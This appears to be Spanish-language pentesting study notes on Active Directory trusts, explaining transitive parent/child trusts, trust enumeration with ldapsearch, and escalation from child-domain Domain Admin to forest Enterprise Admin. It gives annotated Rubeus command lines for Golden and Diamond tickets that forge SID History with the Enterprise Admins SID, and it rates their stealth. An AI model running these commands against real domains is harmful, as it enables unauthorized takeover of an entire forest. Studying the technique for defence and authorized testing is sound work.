#### 👨‍👧 Parent/Child Trusts

Cuando se añade un dominio hijo a un árbol existente, se crea automáticamente una **confianza bidireccional y transitiva** entre el hijo y su padre.

```
                    dragon.com
                   (tree root)
                       │
              ◄────────┴────────►
              trust automática
              bidireccional
                       │
                  ┌────┴────┐
                  │         │
            forge.         storm.
            dragon.com     dragon.com
                            │
            ┌─────┴─────┐
            │           │
         iron.         silver.
         forge.         forge.
         dragon.com     dragon.com
```

---

#### 🔍 ¿Qué significa "confianza implícita"?

```
┌─────────────────────────────────────────────────────────┐
│  EXPLÍCITA: se crea automáticamente al unir un hijo     │
│             a su padre DIRECTO                          │
│                                                         │
│  dragon.com ◄──────────────► forge.dragon.com           │
│  (padre)                      (hijo directo) +          │
│                                                         │
│  forge.dragon.com ◄─────────► iron.forge.dragon.com     │
│  (padre)                      (hijo directo) +          │
│                                                         │
│  IMPLÍCITA: entre nodos que NO son padre/hijo directos  │
│             pero están en el mismo árbol                │
│                                                         │
│  dragon.com ◄──────────────► iron.forge.dragon.com      │
│  (abuelo)                     (nieto) ← IMPLÍCITA +     │
│                               nunca se configuró,       │
│                               existe por transitividad  │
└─────────────────────────────────────────────────────────┘
```

Por la transitividad, TODOS confían en TODOS:

```
dragon.com  ◄──► forge.dragon.com             (explícita)
dragon.com  ◄──► storm.dragon.com             (explícita)
dragon.com  ◄──► iron.forge.dragon.com        (implícita)
dragon.com  ◄──► silver.forge.dragon.com      (implícita)
```

Para enumerar las confianzas del dominio actual:

```
ldapsearch (objectClass=trustedDomain)

Resultado desde forge.dragon.com:
--------------------
name:           dragon.com
trustDirection: 3          ← bidireccional
trustAttributes: 32        ← transitiva
flatName:       DRAGON
```

```
┌─────────────────────────────────────────────────────────┐
│  trustDirection:                                        │
│  1 = el dominio actual confía en el otro (inbound)      │
│  2 = el otro confía en el dominio actual (outbound)     │
│  3 = bidireccional ◄── lo más habitual en parent/child  │
└─────────────────────────────────────────────────────────┘
```

---

#### ⚔️ Escalada de privilegios: Child → Forest Root

Si un atacante consigue **Domain Admin en cualquier dominio hijo**, puede escalar a **Enterprise Admin del bosque entero** mediante un **Golden/Diamond Ticket con SID History**.

```
┌─────────────────────────────────────────────────────────┐
│  ¿Qué es SID History?                                   │
│                                                         │
│  Diseñado para migraciones: cuando un usuario se mueve  │
│  de un dominio a otro, su SID antiguo se guarda en      │
│  SID History para mantener acceso a recursos previos.   │
│                                                         │
│  El atacante lo ABUSA para meter el SID de              │
│  Enterprise Admins del dominio padre en su ticket.      │
└─────────────────────────────────────────────────────────┘
```

```
  ATACANTE (Domain Admin en forge.dragon.com)
         │
         │  Necesita:
         │  ┌─────────────────────────────────────┐
         │  │ 1. AES256 hash del krbtgt del hijo  │
         │  │ 2. SID del dominio hijo             │
         │  │ 3. SID de Enterprise Admins         │
         │  │    del dominio padre (dragon.com)   │
         │  └─────────────────────────────────────┘
         │
         ▼
  Obtiene SID del padre via LDAP:
  ldapsearch (objectClass=domain) --hostname dc.dragon.com
  → objectSid: S-1-5-21-XXXX-XXXX-XXXX
```

---

#### 🎫 Técnica 1: Golden Ticket (offline)

```
Rubeus.exe golden
  /aes256:[hash krbtgt hijo]    ← hash del krbtgt del dominio hijo
  /user:Administrator           ← usuario a suplantar
  /domain:forge.dragon.com      ← dominio hijo
  /sid:[SID dominio hijo]       ← SID del hijo
  /sids:[SID padre]-519         ← Enterprise Admins del padre
  /nowrap
```

---

#### 🎫 Técnica 2: Diamond Ticket (más sigiloso)

```
Rubeus.exe diamond

  /tgtdeleg
  └► Rubeus obtiene tu TGT solo, no hay que pasarle ningún valor

  /ticketuser:Administrator
  └► Usuario a suplantar en el ticket

  /ticketuserid:500
  └► RID del usuario a suplantar
     500 = RID estándar de Administrator en Windows

  /sids:S-1-5-21-XXXX-XXXX-XXXX-519
  └► SID del dominio PADRE + sufijo del grupo privilegiado
     -512 = Domain Admins  (solo el dominio padre)
     -519 = Enterprise Admins (todo el bosque) ◄── objetivo habitual

  /krbkey:[hash AES256 krbtgt del dominio hijo]
  └► Hash del dominio HIJO, donde ya tenemos Domain Admin
     No es el del padre

  /nowrap
  └► Evita que el ticket se parta en varias líneas
```

---

#### 📋 Golden vs Diamond

```
┌─────────────────┬──────────────────────┬──────────────────────┐
│                 │   Golden Ticket      │   Diamond Ticket     │
├─────────────────┼──────────────────────┼──────────────────────┤
│ Creación        │ Completamente offline│ Usa TGT real         │
│ Base            │ Ticket falso 100%    │ Ticket legítimo      │
│ Detección       │ Más fácil detectar  │ Más sigiloso          │
│ Requiere        │ Hash krbtgt hijo     │ Hash krbtgt hijo     │
│                 │ SID hijo + padre     │ + TGT del usuario    │
└─────────────────┴──────────────────────┴──────────────────────┘
```
